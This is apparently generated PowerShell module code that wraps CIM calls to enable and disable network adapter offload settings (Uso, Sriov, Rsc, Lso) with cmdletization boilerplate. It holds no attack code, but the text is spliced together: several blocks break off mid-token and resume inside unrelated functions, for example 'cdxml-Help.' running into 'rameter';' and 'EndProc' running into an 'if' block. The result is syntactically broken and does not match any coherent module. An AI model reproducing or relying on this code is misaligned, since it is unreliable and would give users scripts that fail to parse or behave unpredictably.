$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterUso.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetAdapterUso' -Alias '*'
  

function Disable-NetAdapterUso
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterUsoSettin
gData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv4},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv6},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv4')) {
      [object]$__cmdletization_value = ${IPv4}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6')) {
      [object]$__cmdletization_value = ${IPv6}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterUso.cdxml-Help.
rameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterSriov.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetAdapterSriov' -Alias 
'*'
  

function Disable-NetAdapterSriov
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Low', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterSriovSett
ingData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Disable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProc
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${InterfaceDescription})
  $__cmdletization_queryBuilder.FilterByProperty('InterfaceDescription', 
$__cmdletization_values, $true, 'Default')
}
if ($PSBoundParameters.ContainsKey('IncludeHidden') -and (@('ByName', 
'ByInstanceID') -contains $PSCmdlet.ParameterSetName )) {
$__cmdletization_queryBuilder.AddQueryOption('IncludeHidden', ${IncludeHidden})
}


$__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerS
hell.Cmdletization.MethodParameter]]::new()
switch -exact ($PSCmdlet.ParameterSetName) { 
  { @('ByName', 'ByInstanceID', 'InputObject (cdxml)') -contains $_ } {
    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv4')) {
      [object]$__cmdletization_value = ${IPv4}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv4'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('IPv6')) {
      [object]$__cmdletization_value = ${IPv6}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPv6'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('NoRestart')) {
      [object]$__cmdletization_value = ${NoRestart}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:NoRestart'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
    if ($PSBoundParameters.ContainsKey('PassThru')) {
      [object]$__cmdletization_value = ${PassThru}
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_value; IsValuePresent = $true}
    } else {
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterRsc.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetAdapterRsc' -Alias '*'
  

function Disable-NetAdapterRsc
{
[CmdletBinding(DefaultParameterSetName='ByName', SupportsShouldProcess=$true, 
ConfirmImpact='Medium', PositionalBinding=$false)]

[OutputType([Microsoft.Management.Infrastructure.CimInstance])]
param(

[Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifAlias','InterfaceAlias')]
[ValidateNotNull()]
[string[]]
${Name},

[Parameter(ParameterSetName='ByInstanceID', Mandatory=$true, 
ValueFromPipelineByPropertyName=$true)]
[Alias('ifDesc','InstanceID')]
[ValidateNotNull()]
[string[]]
${InterfaceDescription},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[switch]
${IncludeHidden},

[Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, 
ValueFromPipeline=$true)]
[PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetAdapterRscSettin
gData')]
[ValidateNotNull()]
[ciminstance[]]
${InputObject},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv4},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[ValidateNotNull()]
[ValidateNotNullOrEmpty()]
[switch]
${IPv6},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${NoRestart},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${PassThru},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[Alias('Session')]
[ValidateNotNullOrEmpty()]
[CimSession[]]
${CimSession},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[int]
${ThrottleLimit},

[Parameter(ParameterSetName='ByName')]
[Parameter(ParameterSetName='ByInstanceID')]
[Parameter(ParameterSetName='InputObject (cdxml)')]
[switch]
${AsJob})

DynamicParam {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
          $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, 
$script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

          if ($__cmdletization_objectModelWrapper -is 
[System.Management.Automation.IDynamicParameters])
          {
              ([System.Management.Automation.IDynamicParameters]$__cmdletization_ob
jectModelWrapper).GetDynamicParameters()
          }
      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}

Begin {
  $__cmdletization_exceptionHasBeenThrown = $false
  try 
  {
      __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper 
$PSBoundParameters
      $__cmdletization_objectModelWrapper.BeginProcessing()
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

Process {
  try 
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
$__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains 
$PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Name})
  $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, 
$true, 'Default')
}
if ($PSBoundParameters.ContainsKey('InterfaceDescription') -and (@('ByInstanceID') 
-contains $PSCmdlet.ParameterSetName )) {
  $__cmdletization_values = @(${Interfa
'cim:OperationOption:PassThru'; ParameterType = 
'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = 
$__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
    }
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

    [object]$__cmdletization_defaultValue = $null
    [object]$__cmdletization_defaultValueIsPresent = $false
      $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
      }
  }
}

      }
  }
  catch
  {
      $__cmdletization_exceptionHasBeenThrown = $true
      throw
  }
}
  

End {
  try
  {
      if (-not $__cmdletization_exceptionHasBeenThrown)
      {
          $__cmdletization_objectModelWrapper.EndProcessing()
      }
  }
  catch
  {
      throw
  }
}

# .EXTERNALHELP MSFT_NetAdapterLso.cdxml-Help.xml
}
